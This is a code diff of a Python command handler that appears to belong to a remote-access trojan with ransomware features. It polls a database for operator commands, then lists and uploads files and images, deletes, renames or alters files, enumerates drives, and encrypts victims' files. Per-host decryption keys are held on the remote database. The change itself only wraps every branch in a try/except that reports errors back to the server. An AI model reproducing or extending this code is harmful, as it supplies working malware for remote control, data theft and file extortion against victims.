@@ -159,58 +159,65 @@ def action_take(listen):
     db=client['shell']
     action=listen['action']
     cwd=listen['current_path']
-    if action=='dir':
-        res=action_on_system(command=action,path=cwd)
-        upload((res))
-    elif action=='deletefile':
-        target_element=listen['target_element']
-        action_on_system(command=action,original_filename=target_element,path=cwd)
-    elif action=='getfile':
-        target_element=listen['target_element']
-        content=action_on_system(command=action,original_filename=target_element,path=cwd)
-        data={
-            "hostname":hostname,
-            "result":json.dumps(content)
-        }
-        upload(data)
-    elif action=='updatefile':
-        target_element=listen['target_element']
-        target_string=listen['target_string']
-        action_on_system(command=action,original_filename=target_element,update_str=target_string,path=cwd)
-    elif action=='mkdir':
-        target_element=listen['target_element']
-        action_on_system(command=action,new_foldername=target_element,path=cwd)
-    elif action=='rmdir':
-        target_element=listen['target_element']
-        action_on_system(command=action,new_foldername=target_element,path=cwd)
-    elif action=='createfile':
-        target_element=listen['target_element']
-        action_on_system(command=action,new_filename=target_element,path=cwd)
-    elif action=='renamefile':
-        target_element=listen['target_element']
-        new_filename=listen['new_filename']
-        action_on_system(command=action,original_filename=target_element,new_filename=new_filename,path=cwd)
-    elif action=='disks':
-        drives()
-    elif action=='encrypt':
-        target_element=listen['target_element']
-        encrypt(paths=cwd,file=target_element)
-    elif action=='decrypt':
-        target_element=listen['target_element']
-        filters={
-            "hostname":hostname,
-            "filename":target_element
-        }
-        col=db['privatekey']
-        x=col.find_one(filters)
-        if x:
-            col.delete_one(filters)
-        decrypt(private_key=(str_to_byte(x['key'])),paths=cwd,file=target_element)
-    elif action=='getimg':
-        target_element=listen['target_element']
-        data={
-            "hostname":hostname,
+    try:
+        if action=='dir':
+            res=action_on_system(command=action,path=cwd)
+            upload((res))
+        elif action=='deletefile':
+            target_element=listen['target_element']
+            action_on_system(command=action,original_filename=target_element,path=cwd)
+        elif action=='getfile':
+            target_element=listen['target_element']
+            content=action_on_system(command=action,original_filename=target_element,path=cwd)
+            data={
+                "hostname":hostname,
+                "result":json.dumps(content)
+            }
+            upload(data)
+        elif action=='updatefile':
+            target_element=listen['target_element']
+            target_string=listen['target_string']
+            action_on_system(command=action,original_filename=target_element,update_str=target_string,path=cwd)
+        elif action=='mkdir':
+            target_element=listen['target_element']
+            action_on_system(command=action,new_foldername=target_element,path=cwd)
+        elif action=='rmdir':
+            target_element=listen['target_element']
+            action_on_system(command=action,new_foldername=target_element,path=cwd)
+        elif action=='createfile':
+            target_element=listen['target_element']
+            action_on_system(command=action,new_filename=target_element,path=cwd)
+        elif action=='renamefile':
+            target_element=listen['target_element']
+            new_filename=listen['new_filename']
+            action_on_system(command=action,original_filename=target_element,new_filename=new_filename,path=cwd)
+        elif action=='disks':
+            drives()
+        elif action=='encrypt':
+            target_element=listen['target_element']
+            encrypt(paths=cwd,file=target_element)
+        elif action=='decrypt':
+            target_element=listen['target_element']
+            filters={
+                "hostname":hostname,
+                "filename":target_element
+            }
+            col=db['privatekey']
+            x=col.find_one(filters)
+            if x:
+                col.delete_one(filters)
+            decrypt(private_key=(str_to_byte(x['key'])),paths=cwd,file=target_element)
+        elif action=='getimg':
+            target_element=listen['target_element']
+            data={
+                "hostname":hostname,
             "result":imageReader(path=cwd,file=target_element)
+            }
+            upload(data)
+    except:
+        data={
+            "hostname":hostname,
+            "result":"something wrong!!!"
         }
         upload(data)
 
